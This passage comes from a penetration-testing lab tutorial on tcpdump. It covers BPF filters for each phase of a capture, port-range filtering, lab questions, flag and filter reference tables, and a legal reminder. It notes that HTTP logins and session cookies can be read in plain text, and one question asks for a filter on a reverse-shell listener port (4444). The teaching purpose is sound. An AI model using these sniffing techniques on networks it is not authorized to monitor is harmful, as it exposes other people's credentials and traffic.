> ⚠️ **Security lesson:** This is exactly why HTTP (not HTTPS) is dangerous. Everything — including login forms and session cookies — is readable in plain text by anyone with tcpdump on the network.

---

#### 11.5 — Filter the capture by what happened at each phase

After capturing, you can re-read the `.pcap` file with different filters to focus on each part:

```bash
# See only the DNS phase
sudo tcpdump -r website_capture.pcap -nn port 53

# See only the TCP handshake (SYN packets)
sudo tcpdump -r website_capture.pcap -nn 'tcp[tcpflags] & tcp-syn != 0'

# See only data transfer (PUSH packets — actual content)
sudo tcpdump -r website_capture.pcap -nn 'tcp[tcpflags] & tcp-push != 0'

# See only connection teardown (FIN packets)
sudo tcpdump -r website_capture.pcap -nn 'tcp[tcpflags] & tcp-fin != 0'
```

---

#### 11.6 — Save source and destination ports separately for analysis

```bash
# Traffic your browser SENT (high ephemeral ports → port 80/443)
sudo tcpdump -r website_capture.pcap -nn 'src portrange 49152-65535 and dst port 80'

# Traffic the server SENT BACK (port 80/443 → your ephemeral port)
sudo tcpdump -r website_capture.pcap -nn 'src port 80 and dst portrange 49152-65535'
```

**Sample output (server responses only):**
```
15:40:01.200 IP 93.184.216.34.80 > 192.168.1.10.54001: Flags [P.], length 1440
15:40:01.201 IP 93.184.216.34.80 > 192.168.1.10.54001: Flags [P.], length 1440
15:40:01.350 IP 93.184.216.34.80 > 192.168.1.10.54001: Flags [F.], ack 80
```

**Checkpoint:** Can you capture `curl http://example.com`, read it back, and see the HTTP GET request and 200 OK response in ASCII? ✅

---

## ❓ Lab Questions

Answer these after completing the exercises:

1. What is the difference between using `-n` and `-nn` when reading a `.pcap` file?
2. What filter would you use to capture only DNS traffic from a specific host?
3. Why would you prefer `tcpdump` over Wireshark during a remote penetration test?
4. What does the `-c` flag do, and when is it useful?
5. How would you capture traffic on ALL interfaces at once?
   > **Hint:** Try `any` as the interface name.
6. What is the difference between `src host 192.168.1.10` and `host 192.168.1.10`? When would you prefer one over the other?
7. Write a single tcpdump filter that captures the **full two-way conversation** between `172.17.0.1` and `172.17.0.2` on port `4444` only (a reverse shell listener port).
8. What subnet filter would you use to monitor ALL traffic inside a Docker network (`172.17.0.0/16`)?
9. You're SSH'd into a remote server and running tcpdump. What flag prevents your own SSH session from flooding the output?
10. After capturing `curl http://example.com`, which tcpdump flag lets you read the HTTP GET request body in plain text from the `.pcap` file?

---

## 📊 tcpdump vs. Wireshark — When to Use Which

| Situation | Best Tool |
|-----------|-----------|
| SSH into a remote server with no GUI | **tcpdump** |
| Quick capture to analyze later | **tcpdump** → save `.pcap` → open in **Wireshark** |
| Deep visual protocol inspection | **Wireshark** |
| Automated capture in a script | **tcpdump** |
| Penetration test on a live engagement | **tcpdump** |
| Clicking through packets interactively | **Wireshark** |
| Filtering and following TCP streams visually | **Wireshark** |

**Best practice workflow:**
```
tcpdump (capture) ──► .pcap file ──► Wireshark (analysis)
```

---

## 🔧 Common tcpdump Flags — Quick Reference

| Flag | What it does |
|------|-------------|
| `-i <interface>` | Specify the interface to listen on |
| `-v` / `-vv` / `-vvv` | Increase verbosity |
| `-n` | Don't resolve IPs to hostnames |
| `-nn` | Don't resolve IPs or port numbers |
| `-w <file>` | Write captured packets to a `.pcap` file |
| `-r <file>` | Read from a `.pcap` file |
| `-c <count>` | Stop after capturing N packets |
| `-A` | Print payload in ASCII |
| `-X` | Print payload in HEX + ASCII |
| `-D` | List all available interfaces |

---

## 🔐 Common Capture Filters — Quick Reference

```bash
# By host (use your real Kali IP: 10.x.x.6)
host 10.x.x.6
src host 10.x.x.6
dst host 10.x.x.6

# By port
port 80
port 22
src port 443

# By protocol
tcp | udp | icmp | arp

# By subnet (your active subnet)
net 10.0.2.0/24
src net 10.x.x.0/24

# By Docker network
net 172.17.0.0/16

# Combinations
host 10.x.x.6 and port 443
port 80 or port 443
not port 22
src host 10.x.x.6 and tcp and port 8080
```

---

## ⚠️ Legal & Ethical Reminder

> This lab is intended for use in **authorized lab environments only** — local VMs, Docker containers you control, or platforms like TryHackMe and HackTheBox.
>
> Capturing network traffic on networks you do not own or have explicit written permission to test is **illegal** and violates computer fraud laws in most jurisdictions.
>
> Always practice ethical hacking.

---

## 📚 Additional Resources

- [tcpdump Man Page](https://www.tcpdump.org/manpages/tcpdump.1.html)
- [tcpdump Filter Expressions (BPF)](https://www.tcpdump.org/manpages/pcap-filter.7.html)
- [Wireshark Documentation](https://www.wireshark.org/docs/)
- [HackerSploit YouTube Channel](https://www.youtube.com/@HackerSploit)

---

*Part of the Penetration Testing Lab Series | Maintained for educational use*